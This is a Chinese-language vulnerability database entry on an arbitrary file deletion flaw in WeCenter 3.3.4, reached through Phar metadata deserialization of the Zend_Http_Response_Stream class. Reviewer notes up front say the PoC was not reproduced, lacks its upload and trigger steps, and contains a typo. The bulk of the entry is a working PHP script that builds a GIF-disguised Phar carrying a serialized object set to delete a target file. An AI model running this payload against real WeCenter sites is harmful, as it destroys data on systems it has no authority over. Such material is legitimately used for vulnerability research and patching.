---
source: "hatch 补库批 20260928"
product: "WeCenter3.3.4 + Zend Http Stream"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "WeCenter 3.3.4 任意文件删除"
prerequisites: "来源所述条件，未列明部分仍待核：Phar元数据自动反序列化PHP、类加载、目标可删；应用入口需449/450链"
side_effects: "未执行；本文需注意的操作影响：只有Phar生成器，无上传/触发/登录条件，非独立完整PoC；无原始出处，固定文件删除有副作用"
source_status: "unknown"
id: "vw-409a7153ec00e9124cecb4c1"
entity_id: "ve-409a7153ec00e9124cecb4c1"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Phar元数据自动反序列化PHP、类加载、目标可删；应用入口需449/450链

- **适用与权限边界（1）**：只有Phar生成器，无上传/触发/登录条件，非独立完整PoC。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **适用与权限边界（2）**：phar.readonly0为构造端条件非目标必须；init_set应ini_set。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **操作与副作用边界（3）**：无原始出处，固定文件删除有副作用。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# WeCenter 3.3.4 任意文件删除

一、漏洞简介
------------

二、漏洞影响
------------

WeCenter 3.3.4

三、复现过程
------------

### 任意文件删除

**system/Zend/Http/Response/Stream.php:\_\_destruct()**
方法中存在任意文件删除。

![](./.resource/WeCenter3.3.4任意文件删除/media/rId25.png)

### poc

    <?php
    class Zend_Http_Response_Stream
    {
        protected $_cleanup;
        protected $stream_name;

        public function __construct($stream_name)
        {
            $this->_cleanup = true;
            $this->stream_name = $stream_name;
        }
    }

    $stream_name = '/var/www/html/wecenter334/shell.php';
    $evilobj = new Zend_Http_Response_Stream($stream_name);
    // phar.readonly无法通过该语句进行设置: init_set("phar.readonly",0);
    $filename = 'poc.phar';// 后缀必须为phar，否则程序无法运行
    file_exists($filename) ? unlink($filename) : null;
    $phar=new Phar($filename);
    $phar->startBuffering();
    $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($evilobj);
    $phar->addFromString("foo.txt","bar");
    $phar->stopBuffering();

    ?>
